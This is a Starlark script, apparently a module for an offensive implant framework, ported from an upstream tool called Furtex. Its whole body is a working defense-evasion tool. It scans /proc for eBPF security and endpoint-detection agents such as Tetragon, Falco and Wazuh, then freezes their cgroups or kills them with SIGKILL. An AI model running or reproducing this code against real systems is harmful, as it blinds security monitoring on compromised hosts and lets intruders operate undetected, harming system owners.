# tetragon_blind - find and neutralise eBPF security agents.
#
# Ported to Starlark from Furtex's edrs/tetragon_blind.c.
# Upstream project: https://github.com/MatheuZSecurity/Furtex (MIT License,
# Copyright (c) 2026 MatheuZ). See README.md in this directory for attribution.
#
# Only the process-level actions are ported: scan, freeze, thaw and kill. The
# upstream raw bpf(2) link-detach / program-enumeration half is a poor fit for
# Starlark and belongs to the Go BPF toolkit. freeze/thaw operate on the
# target's existing cgroup v2, and refuse the agent's own cgroup so a freeze
# cannot take the agent down with it.

AT_FDCWD = -100
O_WRONLY = 1
SIGKILL = 9

EDR_NAMES = [
    "tetragon", "cilium-agent", "falco", "falcosecurity",
    "ebpf_exporter", "edr-sensor", "edr_daemon_d", "edr_agentd",
    "edr-agent-t", "edr_endp_t", "wazuhd", "ossec",
]


def _is_pid(name):
    if not name:
        return False
    c = name[0]
    return c >= "0" and c <= "9"


def _write_ctl(path, data):
    res = sys_call("openat", AT_FDCWD, path, O_WRONLY, 0)
    if res["errno"] != 0:
        return res["errno"]
    fd = res["r1"]
    w = sys_call("write", fd, data, len(data))
    sys_call("close", fd)
    return w["errno"]


def _find_procs(pattern):
    hits = []
    for pid in list_dir("/proc"):
        if not _is_pid(pid):
            continue
        comm = read_file("/proc/%s/comm" % pid, default="").strip()
        if not comm:
            continue
        if str_contains(comm, pattern):
            hits.append("%s\t%s" % (pid, comm))
    return hits


def _scan(pattern):
    print("[*] scanning for eBPF security processes")
    found = 0
    names = EDR_NAMES
    if pattern:
        names = [pattern]
    for name in names:
        for hit in _find_procs(name):
            pid, comm = hit.split("\t")
            print(sprintf("  [!] %-20s pid=%s", comm, pid))
            found += 1
    if found == 0:
        print("  [*] none found")
    return "OK"


def _cgroup_dir(pid):
    data = read_file("/proc/%s/cgroup" % pid, default="")
    for line in data.splitlines():
        parts = line.split(":")
        if len(parts) >= 3 and parts[0] == "0":
            rel = parts[2]
            if rel == "/":
                return "/sys/fs/cgroup"
            return "/sys/fs/cgroup" + rel
    return ""


def _freeze(pid, frozen):
    if not pid:
        print("[!] freeze/thaw requires --pid")
        return "ERROR: pid required"
    target = _cgroup_dir(pid)
    if not target:
        print("[!] cgroup v2 (unified) not found for pid %s" % pid)
        return "ERROR: cgroup v2 required"
    if target == _cgroup_dir("self"):
        print("[!] refusing to touch the agent's own cgroup (%s)" % target)
        return "ERROR: refusing own cgroup"
    value = "1" if frozen else "0"
    errno = _write_ctl(target + "/cgroup.freeze", value)
    if errno != 0:
        print("[!] writing cgroup.freeze=%s failed (errno=%d; root required)" % (value, errno))
        return "ERROR: errno=%d" % errno
    print("[+] pid %s %s (%s/cgroup.freeze=%s)" % (pid, "frozen" if frozen else "thawed", target, value))
    return "OK"


def _kill(pid):
    if not pid:
        print("[!] kill requires --pid")
        return "ERROR: pid required"
    res = sys_call("kill", pid, SIGKILL)
    if res["errno"] != 0:
        print("[!] kill(%s, SIGKILL) failed (errno=%d)" % (pid, res["errno"]))
        return "ERROR: errno=%d" % res["errno"]
    print("[+] SIGKILL sent to pid %s" % pid)
    return "OK"


def main(*args):
    action = "scan"
    pid = ""
    pattern = ""
    if args and args[0]:
        action = str_lower(args[0].strip())
    if len(args) > 1 and args[1]:
        pid = args[1].strip()
    if len(args) > 2 and args[2]:
        pattern = args[2]

    if action == "scan":
        return _scan(pattern)
    if action == "freeze":
        return _freeze(pid, True)
    if action == "thaw":
        return _freeze(pid, False)
    if action == "kill":
        return _kill(pid)
    print("[!] unknown action: %s" % action)
    return "ERROR: unknown action"
